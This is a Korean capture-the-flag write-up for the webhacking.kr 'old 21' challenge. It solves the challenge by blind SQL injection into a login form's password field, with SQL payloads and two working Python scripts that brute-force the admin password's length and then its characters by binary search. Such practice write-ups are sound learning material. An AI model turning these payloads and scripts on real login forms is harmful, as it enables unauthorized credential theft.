---
title: "webhacking.kr old 21 문제 풀이"
date: 2025-04-08 00:00:00 +0800
categories: [Wargame, Webhacking.kr]
tags: [cyber security, writeup, webhackingkr, web hacking, blind sql injection] 
description: webhacking.kr old 21 문제 풀이
---

[https://webhacking.kr/challenge/bonus-1/](https://webhacking.kr/challenge/bonus-1/)
# 문제 풀이
## 분석
페이지에 접속하면 id와 pw 입력을 받는 인풋 박스가 있고 로그인의 성공, 실패를 알려주는 알림창 같은 것이 있다.<br />

혹시 몰라 guest를 두 입력 값에 모두 넣어주니 "login success" 문구가 나온다. 똑같이 admin을 입력하면 "login fail"이라고 한다.<br />
비밀번호로 인젝션 가능 여부를 판단할 때 사용되는 쿼리 구문을 입력하니 (`' or 1=1 -- `) 이번에는 wrong password가 나오는 것이 확인된다.<br /> 반면에 `' or 1=2 -- `와 같이 거짓 값을 넣어주니 login fail이 출력된다.<br />

이로써 우리는 쿼리가 반환되면 "login success" 혹은 "wrong password"가 출력되고 반환되지 않으면 "login fail"이 출력되는 듯 보인다.<br />
반환됐을 경우 아마 php 코드에 의해 비밀번호 검증을 2차로 수행하여 결과에 따라 메세지를 출력하는 것으로 보인다.<br />

쿼리의 성공 여부만 알 수 있는 이 경우에 Blind SQLI를 사용할 수 있는데 참고로 페이지 한 가운데에 "BLIND SQL INJECTION"이라고 대놓고 힌트를 주고있다.<br />
## 최종 풀이
### 예상되는 쿼리
인젝션을 진행하기에 앞서 더 손쉬운 인젝션을 위해 우선 서버 쪽의 쿼리가 어떤식으로 생겼을지 예상해보아야 한다.<br />

```sql
select * from users where id={id_input} and pw={pw_input}
```
이 쿼리가 아마 가장 유력할 것 같은데, 예상되기로는 해당 쿼리가 값을 리턴한다면 success, wrong password 그렇지 않다면 fail로 보는 것 같다.<br />
### 비밀번호 길이 구하기
```python
import requests

url = "https://webhacking.kr/challenge/bonus-1/index.php?"

for i in range(1, 100):
    param = {
        "id": "admin",
        "pw": f"' or length(pw)={i} and id='admin' -- "
    }

    resp = requests.get(url, params=param)
    print(i)
    if "wrong password" in resp.text:
        print(resp.text)
        break
```
비밀번호의 길이를 구하기 위한 쿼리를 `' or length(pw)={i} and id='admin' -- `로 작성하고 i 값을 1부터 100까지 늘리면서 "wrong password"가 출력된다면 길이를 찾은 것으로 간주하여 break로 빠져나오는 방식이다.<br />
이 방식으로 비밀번호의 길이는 36이라는 것을 알아냈다.<br />
### 비밀번호 구하기
```python
import requests
import string

url = "https://webhacking.kr/challenge/bonus-1/index.php?"

password = ""
for i in range(1, 36 + 1):
    low = 32
    high = 126

    while low <= high:
        mid = (high + low) // 2
        param = {
            "id": "admin",
            "pw": f"' or ord(substr(pw, {i}, 1))<={mid} and id='admin' -- "
        }
        resp = requests.get(url, params=param)
        if "wrong password" in resp.text:
            # checking if the mid is the RIGHT CHARACTER
            param["pw"] = f"' or ord(substr(pw, {i}, 1))={mid} and id='admin' -- "
            resp = requests.get(url, params=param)
            if "wrong password" in resp.text: 
                break
            else: high = mid - 1
        else:
            low = mid + 1
    
    print(chr(mid), i)
    password += chr(mid)

print(password)
```
비밀번호를 구하는 알고리즘은 조금 더 복잡하다.<br />
자세히보면 binary search 알고리즘을 사용하고있는 것을 알 수 있다. ascii 코드 상으로 보았을 때 비밀번호에 들어갈 수 있는 글자는 총 95개이다. 비밀번호의 글자 수가 36개인데 각 자리마다 95번(최악의 경우)씩 연산을 하면 너무 비효율적이고 오래걸리기도 해서 이진 탐색을 채택했다.<br />

여기서 주목해야할 점은 `substr(pw, {i}, 1)<={mid}`를 통과했을 때 다시 한 번 `substr(pw, {i}, 1)={mid}`를 통과하는지 체크한다.<br />
왜냐하면 정확한 글자를 찾아놓고선 이를 알지 못하고 다시 한 번 탐색을 진행하게 돼 우리가 원치 않은 정보를 얻을 수 있기 때문이다.<br /> 
실제로 해당 부분을 지우고 실행해보면 몇 몇 글자에서 잘못된 글자를 얻게된다.<br />

결국 해당 코드를 실행시키면 36글자로 이루어진 읽을 수 있는 영어 문장이 나온다.<br />
id를 admin으로 그리고 이 비밀번호를 pw에 넣어주고 제출하면 문제가 해결된다.<br />
#### 추가 정보
원래라면 Blind SQLI에서는 컬럼 이름을 알아내기 위해서는 DB 이름, 테이블 이름 등을 알아내는 것이 우선시된다.<br /> 
하지만 이 문제에서는 난이도가 낮은 탓에 URL 파라미터로 받는 이름 그대로 컬럼 이름이 설정돼있어서 이 부분이 생략될 수 있었다.<br />